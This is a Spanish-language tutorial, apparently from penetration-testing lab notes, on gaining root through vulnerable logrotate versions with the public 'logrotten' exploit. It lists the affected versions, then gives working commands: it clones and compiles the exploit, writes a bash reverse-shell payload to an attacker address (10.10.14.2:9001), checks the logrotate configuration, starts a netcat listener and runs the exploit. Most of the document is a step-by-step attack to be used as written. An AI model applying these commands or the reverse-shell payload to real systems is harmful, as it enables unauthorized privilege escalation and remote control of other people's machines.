# Explotación de **logrotate** con **logrotten**

## 📌 Introducción
Los sistemas Linux generan grandes cantidades de archivos de registro (**logs**). Para evitar que llenen el disco, se utiliza la herramienta **logrotate**, que archiva o elimina registros antiguos.  
Si los registros no se gestionan correctamente, pueden ocupar demasiado espacio y dificultar la búsqueda de información crítica.

## 🎯 Objetivo
Explotar una versión vulnerable de **logrotate** para obtener una **shell reversa** como usuario privilegiado o root.

## 🛠 Requisitos
Para explotar **logrotate**, se deben cumplir las siguientes condiciones:
1. Tener **permisos de escritura** en los archivos de log.
2. **logrotate** debe ejecutarse como un usuario privilegiado o **root**.
3. La versión del sistema debe ser **vulnerable**. Versiones afectadas:
   - **3.8.6**
   - **3.11.0**
   - **3.15.0**
   - **3.18.0**

## 🚀 Explotación con **logrotten**
Si se cumplen los requisitos, podemos usar un exploit prefabricado llamado **logrotten**.  

### **1️⃣ Descarga y compilación del exploit**
Si el sistema de destino permite la compilación, podemos hacerlo directamente allí. De lo contrario, compilamos en una máquina con un kernel similar y transferimos el binario.

```sh
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten
```

### **2️⃣ Creación del payload**

Generamos un payload con una **shell reversa** que se conectará a nuestra máquina atacante (**10.10.14.2:9001** en este caso).

```bash
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

### **3️⃣ Identificación de configuración vulnerable**

Verificamos si **logrotate** tiene la opción `create`, lo que significa que podemos usar el exploit con este método:

```bash
grep "create\|compress" /etc/logrotate.conf | grep -v "#"

```

ejemplo de salida:
	 create
Dado que la opción `create` está habilitada, adaptamos el exploit en consecuencia.

### **4️⃣ Configuración del listener en nuestra máquina**

Antes de ejecutar el exploit, iniciamos un **listener** en nuestra máquina para recibir la conexión:
```bash
nc -nlvp 9001

```
### **5️⃣ Ejecución del exploit**

Ejecutamos el exploit indicando el payload y el archivo de log vulnerable:
```bash
./logrotten -p ./payload /tmp/tmp.log

```

Si la explotación es exitosa, recibiremos una conexión en nuestro listener